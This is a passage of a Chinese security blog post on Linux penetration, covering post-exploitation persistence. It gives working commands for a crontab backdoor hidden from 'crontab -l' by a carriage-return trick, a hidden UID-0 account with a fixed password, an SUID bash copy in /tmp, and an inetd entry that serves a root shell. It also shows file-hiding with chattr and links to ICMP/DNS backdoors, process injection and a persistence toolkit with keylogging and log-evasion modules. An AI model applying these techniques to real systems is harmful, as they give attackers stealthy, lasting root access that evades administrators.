+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/etc/init.d/</span><br><span class="line">/etc/profile.d/</span><br><span class="line">/etc/rc.d/xxx <span class="comment"># 在xxx中添加需要开机执行的脚本的绝对路径</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>bash shell启动项</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/etc/profile </span><br><span class="line"><span class="variable">$HOME</span>/.bash_profile</span><br><span class="line"><span class="variable">$HOME</span>/.bashrc </span><br><span class="line"><span class="variable">$HOME</span>/.bash_login </span><br><span class="line"><span class="variable">$HOME</span>/.profile </span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="定时任务后门"><a href="#定时任务后门" class="headerlink" title="定时任务后门"></a>定时任务后门</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo xxx &gt; /tmp/1.elf</span><br><span class="line">chmod +x /tmp/1.elf</span><br><span class="line"></span><br><span class="line">(crontab -l;printf &quot;*/1 * * * * /bin/bash /tmp/1.elf;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n&quot;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../blog/source/images/image-20230830235507613.png" alt="image-20230830235507613"></p>
+<p>将no crontab for <code>whoami</code>文件写到&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root中，而crontab -l就是列出了该文件的内容。所以当管理员使用crontab -l查看定时任务时，就会看到no crontab for root，从而起到了隐藏的效果。</p>
+<p><img src="/../../../blog/source/images/image-20230830235746458.png" alt="image-20230830235746458"></p>
+<h2 id="添加超级用户"><a href="#添加超级用户" class="headerlink" title="添加超级用户"></a>添加超级用户</h2><p>应急响应第一个就排查<code>/etc/passwd</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">useradd -p `openssl passwd -1 -salt &#x27;salt&#x27; 123456` guest -o -u 0 -g root -G root -s /bin/bash -d /home/test</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../blog/source/images/image-20230831001351639.png" alt="image-20230831001351639"></p>
+<h2 id="Suid后门"><a href="#Suid后门" class="headerlink" title="Suid后门"></a>Suid后门</h2><blockquote>
+<p><strong>SUID权限仅对二进制程序有效</strong></p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp /bin/bash /tmp/.long #将bash命令cp到.long二进制程序中</span><br><span class="line">chmod u+s /tmp/.long #赋予SUID文件的权限</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/tmp/.long -p </span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>bash2 针对suid有一些防护，所以需要加上-p参数来获取一个root的shell。</p>
+</blockquote>
+<p><img src="/../../../blog/source/images/image-20230831155343319.png" alt="image-20230831155343319"></p>
+<h2 id="inetd后门"><a href="#inetd后门" class="headerlink" title="inetd后门"></a>inetd后门</h2><p>inetd是一个监听外部网络请求(就是一个socket)的系统守护进程，默认情况下为13端口。当inetd接收到一个外部请求后，它会根据这个请求到自己的配置文件中去找到实际处理它的程序，然后再把接收到的这个socket交给那个程序去处理。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装</span></span><br><span class="line">apt-get install openbsd-inetd  </span><br><span class="line"><span class="comment"># 写入配置文件</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;daytime stream tcp nowait root /bin/bash bash -i&#x27;</span> &gt;&gt; /etc/inetd.conf</span><br><span class="line"><span class="comment"># 请求daytime服务对应的13端口</span></span><br><span class="line">nc -vv 192.168.111.128 13</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20231015225609770.png" alt="image-20231015225609770"></p>
+<p>配置解释</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;service_name&gt; &lt;sock_type&gt; &lt;proto：TCP/UDP&gt; &lt;flags&gt; &lt;user&gt; &lt;server_path：绝对路径&gt; &lt;args&gt;</span><br><span class="line">daytime stream tcp nowait root /bin/bash bash -i <span class="comment"># 当外部请求名为daytime的服务时就弹shell</span></span><br></pre></td></tr></table></figure>
+
+<p>更改的话只需要修改service_name和nc连接的端口，服务与端口的映射关系在<code>/etc/services</code>中</p>
+<h2 id="ICMP后门"><a href="#ICMP后门" class="headerlink" title="ICMP后门"></a>ICMP后门</h2><p><a target="_blank" rel="noopener" href="https://github.com/andreafabrizi/prism">https://github.com/andreafabrizi/prism</a></p>
+<h2 id="DNS后门"><a href="#DNS后门" class="headerlink" title="DNS后门"></a>DNS后门</h2><p><a target="_blank" rel="noopener" href="https://github.com/DamonMohammadbagher/NativePayload_DNS">https://github.com/DamonMohammadbagher/NativePayload_DNS</a><br><a target="_blank" rel="noopener" href="https://github.com/iagox86/dnscat2">https://github.com/iagox86/dnscat2</a><br><a target="_blank" rel="noopener" href="http://code.kryo.se/iodine">http://code.kryo.se/iodine</a></p>
+<h2 id="进程注入"><a href="#进程注入" class="headerlink" title="进程注入"></a>进程注入</h2><p><a target="_blank" rel="noopener" href="https://github.com/gaffe23/linux-inject">https://github.com/gaffe23/linux-inject</a><br><a target="_blank" rel="noopener" href="https://sourceforge.net/projects/cymothoa/files/">https://sourceforge.net/projects/cymothoa/files/</a><br><a target="_blank" rel="noopener" href="https://github.com/screetsec/Vegile">https://github.com/screetsec/Vegile</a></p>
+<h2 id="隐藏文件-x2F-目录技巧"><a href="#隐藏文件-x2F-目录技巧" class="headerlink" title="隐藏文件&#x2F;目录技巧"></a>隐藏文件&#x2F;目录技巧</h2><ul>
+<li><p>创建以.开头的隐藏文件</p>
+<p>用<code>ls -a</code>才能看到</p>
+</li>
+<li><p>建立文件名为<code>...</code>的文件</p>
+</li>
+<li><p>参数混淆</p>
+<blockquote>
+<p>下面两种方法可以使用<code>rm -- -rm</code>删除</p>
+</blockquote>
+<ul>
+<li>建立文件名为<code>-rm</code>的文件</li>
+</ul>
+<p><img src="/../images/image-20231015223351352.png" alt="image-20231015223351352"></p>
+<ul>
+<li><p>建立文件名为<code>--</code>的文件</p>
+<p><img src="/../images/image-20231015223510528.png" alt="image-20231015223510528"></p>
+<p>既不报错，也没有删除</p>
+</li>
+</ul>
+</li>
+<li><p>chattr隐藏权限</p>
+<blockquote>
+<p>chattr +i 是一个 Linux 命令，用于将文件或目录设置为不可修改（immutable）。当应用了 +i 属性后，文件或目录将无法被修改、删除、重命名或链接。这个属性主要用于保护关键系统文件或目录，防止它们被意外或恶意篡改。请注意，这个命令需要在<strong>具有管理员权限的用户</strong>下执行</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chattr +i hack.sh  <span class="comment">#lsattr才可以看到该权限</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><img src="/../../../blog/source/images/image-20230831163015163.png" alt="image-20230831163015163"></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 删除</span></span><br><span class="line">chattr -i hack.sh</span><br><span class="line"><span class="built_in">rm</span> -rf hack.sh</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>需要python3环境<a target="_blank" rel="noopener" href="https://github.com/RuoJi6/HackerPermKeeper">RuoJi6&#x2F;HackerPermKeeper (github.com)</a></p>
+<table>
+<thead>
+<tr>
+<th>🔒权限维持模块</th>
+<th>centos</th>
+<th>Ubuntu</th>
+<th>推荐指数</th>
+<th>需要权限</th>
+<th>备注</th>
+<th>py2</th>
+<th>py3</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>OpenSSH后门万能密码&amp;记录密码</td>
+<td>❌</td>
+<td>✔️</td>
+<td>⭐</td>
+<td>root</td>
+<td>此后门需要很老的内核版本，而且需要很多依赖环境</td>
+<td>❌</td>
+<td>✔️</td>
+</tr>
+<tr>
+<td>PAM后门</td>
+<td>❌</td>
+<td>❌</td>
+<td>⭐</td>
+<td>❌</td>
+<td>此后门需要很老的内核版本，而且需要很多依赖环境</td>
+<td>❌</td>
+<td>❌</td>
+</tr>
+<tr>
+<td>ssh软链接</td>
+<td>✔️</td>
+<td>✔️</td>
+<td>⭐ ⭐</td>
+<td>root</td>
+<td>容易被发现</td>
+<td>✔️</td>
+<td>✔️</td>
+</tr>
+<tr>
+<td>ssh公私密钥</td>
+<td>✔️</td>
+<td>✔️</td>
+<td>⭐ ⭐ ⭐ ⭐ ⭐</td>
+<td>User</td>
+<td>发现程度很难，参考了挖矿病毒</td>
+<td>✔️</td>
+<td>✔️</td>
+</tr>
+<tr>
+<td>后门帐号</td>
+<td>✔️</td>
+<td>✔️</td>
+<td>⭐ ⭐ ⭐</td>
+<td>root</td>
+<td>用命令添加账户，不会创建用户home目录[有一个是直接指向root目录]</td>
+<td>✔️</td>
+<td>✔️</td>
+</tr>
+<tr>
+<td>crontab计划任务</td>
+<td>✔️</td>
+<td>✔️</td>
+<td>⭐ ⭐ ⭐ ⭐</td>
+<td>User or root</td>
+<td>难以发现，通过执行计划任务</td>
+<td>✔️</td>
+<td>✔️</td>
+</tr>
+<tr>
+<td>Strace后门</td>
+<td>✔️</td>
+<td>✔️</td>
+<td>⭐ ⭐</td>
+<td>root</td>
+<td>键盘记录的后门</td>
+<td>✔️</td>
+<td>✔️</td>
+</tr>
+<tr>
+<td>Alias后门</td>
+<td>✔️</td>
+<td>✔️</td>
+<td>⭐ ⭐ ⭐ ⭐</td>
+<td>root</td>
+<td>别名后门，难以发现，但是需要用户去执行命令</td>
+<td>✔️</td>
+<td>✔️</td>
+</tr>
+<tr>
+<td>Rootkit后门[检测]</td>
+<td>❌</td>
+<td>❌</td>
+<td>⭐ ⭐ ⭐</td>
+<td>root</td>
+<td>难以发现，但是安装复杂，而且指定内核版本</td>
+<td>❌</td>
+<td>❌</td>
+</tr>
+<tr>
+<td>空格不记录命令</td>
+<td>✔️</td>
+<td>✔️</td>
+<td>⭐ ⭐ ⭐⭐⭐⭐</td>
+<td>root</td>
+<td>有的服务器设置了空格记录执行命令，执行这个脚本快速设置不记录空格命令</td>
+<td>✔️</td>
+<td>✔️</td>
+</tr>
+<tr>
+<td>ssh软链接&amp;crontab</td>
+<td>✔️</td>
+<td>✔️</td>
+<td>⭐ ⭐ ⭐ ⭐</td>
+<td>root</td>
+<td>快速生成软链接，并且执行计划任务，每分钟判断当前软链接是否存在，如果被kill掉，就重新执行</td>
+<td>✔️</td>
+<td>✔️</td>
+</tr>
+<tr>
+<td>check.py</td>
+<td>✔️</td>
+<td>✔️</td>
+<td>⭐ ⭐ ⭐ ⭐⭐⭐</td>
+<td>User</td>
+<td>快速检测目标机器可以使用那个权限维持模块</td>
+<td>✔️</td>
+<td>✔️</td>
+</tr>
+<tr>
+<td>sshkey密钥&amp;crontab</td>
+<td>✔️</td>
+<td>✔️</td>
+<td>⭐ ⭐ ⭐ ⭐⭐ ⭐</td>
+<td>User or root</td>
+<td>快速生成ssh密钥，并且执行计划任务，每分钟判断当前密钥和多个文件是否存在，如果被kill掉，就重新执行</td>
+<td>✔️</td>
+<td>✔️</td>
+</tr>
+<tr>
+<td>php权限维持不死免杀马</td>
+<td>✔️</td>
+<td>✔️</td>
+<td>⭐ ⭐ ⭐ ⭐⭐ ⭐</td>
+<td>User or root</td>
+<td>phpweb权限维持马</td>
+<td>✔️</td>
+<td>✔️</td>
+</tr>
+</tbody></table>
+<h1 id="Linux痕迹清理"><a href="#Linux痕迹清理" class="headerlink" title="Linux痕迹清理"></a>Linux痕迹清理</h1></article><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://fgtbnc.github.io/images/wallhaven-r29l9q.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2023/10/13/%E8%A3%85%E6%9C%BA%E4%B9%8B%E6%8D%A2%E5%86%85%E5%AD%98%E6%9D%A1/"><img class="next-cover" src="https://fgtbnc.github.io/images/wallhaven-j8lqmp.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">如何更换内存条</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://raw.githubusercontent.com/Khazing/typora-img/main/16870577801892f4a9c5aac2e9e5422a6ccd26db10dd88c73.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Khaz</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">79</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8"><span class="toc-number">1.</span> <span class="toc-text">容器逃逸</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Linux%E6%8F%90%E6%9D%83"><span class="toc-number">2.</span> <span class="toc-text">Linux提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BE%85%E5%8A%A9%E5%B7%A5%E5%85%B7"><span class="toc-number">2.1.</span> <span class="toc-text">辅助工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GTFOBins"><span class="toc-number">2.1.1.</span> <span class="toc-text">GTFOBins</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#beroot"><span class="toc-number">2.1.2.</span> <span class="toc-text">beroot</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linepeas%E2%80%93%E4%B8%8D%E5%8F%AA%E6%98%AF%E6%8F%90%E6%9D%83"><span class="toc-number">2.1.3.</span> <span class="toc-text">Linepeas–不只是提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pspy%E2%80%93%E8%BF%9B%E7%A8%8B%E7%9B%91%E6%8E%A7"><span class="toc-number">2.1.4.</span> <span class="toc-text">pspy–进程监控</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#traior%E2%80%93%E8%87%AA%E5%8A%A8%E5%8C%96%E6%8F%90%E6%9D%83%F0%9F%90%82"><span class="toc-number">2.1.5.</span> <span class="toc-text">traior–自动化提权🐂</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%89%8B%E6%B3%95"><span class="toc-number">2.2.</span> <span class="toc-text">常见提权手法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83"><span class="toc-number">2.2.1.</span> <span class="toc-text">内核提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#suid%E6%8F%90%E6%9D%83"><span class="toc-number">2.2.2.</span> <span class="toc-text">suid提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo%E6%8F%90%E6%9D%83"><span class="toc-number">2.2.3.</span> <span class="toc-text">sudo提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8D%E6%81%B0%E5%BD%93%E7%9A%84sudo%E5%91%BD%E4%BB%A4%E9%85%8D%E7%BD%AE"><span class="toc-number">2.2.3.1.</span> <span class="toc-text">不恰当的sudo命令配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Linux-sudo%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-3156%EF%BC%89%E2%80%93-%E6%88%90%E5%8A%9F%E7%8E%87%E9%AB%98"><span class="toc-number">2.2.3.2.</span> <span class="toc-text">Linux sudo权限提升漏洞（CVE-2021-3156）– 成功率高</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%8F%90%E6%9D%83"><span class="toc-number">2.2.4.</span> <span class="toc-text">环境变量提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E6%8F%90%E6%9D%83"><span class="toc-number">2.2.5.</span> <span class="toc-text">权限配置不当提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-number">2.2.6.</span> <span class="toc-text">其他</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#teehee"><span class="toc-number">2.2.6.1.</span> <span class="toc-text">teehee</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Linux%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">3.</span> <span class="toc-text">Linux信息收集</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Linux%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">4.</span> <span class="toc-text">Linux横向移动</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">5.</span> <span class="toc-text">Linux权限维持</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SSH%E5%90%8E%E9%97%A8"><span class="toc-number">5.1.</span> <span class="toc-text">SSH后门</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH-wrapper"><span class="toc-number">5.1.1.</span> <span class="toc-text">SSH wrapper</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH-%E8%BD%AF%E8%BF%9E%E6%8E%A5%E5%90%8E%E9%97%A8"><span class="toc-number">5.1.2.</span> <span class="toc-text">SSH 软连接后门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH-%E5%85%AC%E9%92%A5%E5%85%8D%E5%AF%86%E7%99%BB%E9%99%86"><span class="toc-number">5.1.3.</span> <span class="toc-text">SSH 公钥免密登陆</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#strace%E5%90%8E%E9%97%A8"><span class="toc-number">5.2.</span> <span class="toc-text">strace后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%87%AA%E5%90%AF%E5%8A%A8%E6%96%87%E4%BB%B6%E5%90%8E%E9%97%A8"><span class="toc-number">5.3.</span> <span class="toc-text">自启动文件后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%90%8E%E9%97%A8"><span class="toc-number">5.4.</span> <span class="toc-text">定时任务后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B7%BB%E5%8A%A0%E8%B6%85%E7%BA%A7%E7%94%A8%E6%88%B7"><span class="toc-number">5.5.</span> <span class="toc-text">添加超级用户</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Suid%E5%90%8E%E9%97%A8"><span class="toc-number">5.6.</span> <span class="toc-text">Suid后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#inetd%E5%90%8E%E9%97%A8"><span class="toc-number">5.7.</span> <span class="toc-text">inetd后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ICMP%E5%90%8E%E9%97%A8"><span class="toc-number">5.8.</span> <span class="toc-text">ICMP后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DNS%E5%90%8E%E9%97%A8"><span class="toc-number">5.9.</span> <span class="toc-text">DNS后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">5.10.</span> <span class="toc-text">进程注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6-x2F-%E7%9B%AE%E5%BD%95%E6%8A%80%E5%B7%A7"><span class="toc-number">5.11.</span> <span class="toc-text">隐藏文件&#x2F;目录技巧</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7"><span class="toc-number">5.12.</span> <span class="toc-text">工具</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Linux%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86"><span class="toc-number">6.</span> <span class="toc-text">Linux痕迹清理</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/10/15/Linux%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" title="Linux渗透总结"><img src="https://fgtbnc.github.io/images/wallhaven-r29l9q.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Linux渗透总结"/></a><div class="content"><a class="title" href="/2023/10/15/Linux%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" title="Linux渗透总结">Linux渗透总结</a><time datetime="2023-10-15T11:48:25.000Z" title="发表于 2023-10-15 19:48:25">2023-10-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/10/13/%E8%A3%85%E6%9C%BA%E4%B9%8B%E6%8D%A2%E5%86%85%E5%AD%98%E6%9D%A1/" title="如何更换内存条"><img src="https://fgtbnc.github.io/images/wallhaven-j8lqmp.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="如何更换内存条"/></a><div class="content"><a class="title" href="/2023/10/13/%E8%A3%85%E6%9C%BA%E4%B9%8B%E6%8D%A2%E5%86%85%E5%AD%98%E6%9D%A1/" title="如何更换内存条">如何更换内存条</a><time datetime="2023-10-13T09:14:25.000Z" title="发表于 2023-10-13 17:14:25">2023-10-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/10/12/APP%E6%B8%97%E9%80%8F/" title="APP渗透"><img src="https://fgtbnc.github.io/images/wallhaven-xl8gq3.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="APP渗透"/></a><div class="content"><a class="title" href="/2023/10/12/APP%E6%B8%97%E9%80%8F/" title="APP渗透">APP渗透</a><time datetime="2023-10-12T11:48:25.000Z" title="发表于 2023-10-12 19:48:25">2023-10-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/10/07/%E8%BF%91%E6%BA%90%E6%B8%97%E9%80%8F%E4%B9%8BBadUsb/" title="近源渗透之BadUSB"><img src="https://fgtbnc.github.io/images/wallhaven-r29l9q.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="近源渗透之BadUSB"/></a><div class="content"><a class="title" href="/2023/10/07/%E8%BF%91%E6%BA%90%E6%B8%97%E9%80%8F%E4%B9%8BBadUsb/" title="近源渗透之BadUSB">近源渗透之BadUSB</a><time datetime="2023-10-07T11:48:25.000Z" title="发表于 2023-10-07 19:48:25">2023-10-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/10/05/Web%E5%AE%89%E5%85%A8%E4%B9%8BJSONP%E4%B8%8ECORS/" title="JSONP与CORS"><img src="https://fgtbnc.github.io/images/wallhaven-j8lqmp.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="JSONP与CORS"/></a><div class="content"><a class="title" href="/2023/10/05/Web%E5%AE%89%E5%85%A8%E4%B9%8BJSONP%E4%B8%8ECORS/" title="JSONP与CORS">JSONP与CORS</a><time datetime="2023-10-05T14:00:25.000Z" title="发表于 2023-10-05 22:00:25">2023-10-05</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2023 By Khaz</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script src="/js/chocolate.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
